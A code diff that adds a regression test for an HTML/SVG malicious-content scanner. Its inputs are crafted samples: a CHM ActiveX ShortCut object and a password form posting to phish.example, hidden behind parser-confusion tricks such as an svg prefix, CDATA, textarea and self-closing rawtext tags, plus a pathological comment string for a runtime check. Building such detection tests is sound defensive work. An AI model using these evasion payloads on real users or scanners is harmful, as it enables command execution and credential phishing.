@@ -559,3 +559,42 @@ def test_review_r4_regressions_rcdata_rawtext_and_linear_comments_pis(
     _scan(tmp_path, "many_comments.html", many_comments)
     _scan(tmp_path, "many_pis.svg", many_pis)
     assert time.perf_counter() - t0 < 2.0
+
+
+def test_review_r5_regressions_svg_prefix_in_html_self_closing_rawtext_and_bang_comments(
+    tmp_path: Path,
+) -> None:
+    # Blocker 1: leading <svg></svg> in .html must stay in HTML5 tokenizer mode!
+    svg_cdata_chm = (
+        b'<svg></svg><![CDATA[>'
+        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+        b'<param name="Command" value="ShortCut"></object>'
+    )
+    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "svg_prefix_chm.html", svg_cdata_chm))
+
+    svg_ta_cred = (
+        b'<svg></svg><textarea><x a="</textarea>'
+        b'<form action="https://phish.example"><input type="password"></form><!--"-->'
+    )
+    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "svg_prefix_ta.html", svg_ta_cred))
+
+    svg_pi_cred = (
+        b'<svg></svg><?x>'
+        b'<form action="https://phish.example"><input type="password"></form>?>'
+    )
+    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "svg_prefix_pi.html", svg_pi_cred))
+
+    # Blocker 2: HTML5 self-closing <textarea/> / <style/> / <script/> must NOT close RAWTEXT
+    for tag in ("textarea", "title", "style", "script", "xmp", "iframe", "noembed", "noframes"):
+        doc = (
+            f'<!DOCTYPE html><html><body><{tag}/><x a="</{tag}>'
+            f'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+            f'<param name="Command" value="ShortCut"></object><!--"--></body></html>'
+        ).encode()
+        assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"selfclose_{tag}.html", doc))
+
+    # Major 3: O(N) runtime on ('<!-- --!>' * 50_000) + '-->'
+    adv_bang = b"<!DOCTYPE html>" + b"<!-- --!>" * 50_000 + b"-->"
+    t0 = time.perf_counter()
+    _scan(tmp_path, "adv_bang_comments.html", adv_bang)
+    assert time.perf_counter() - t0 < 2.0
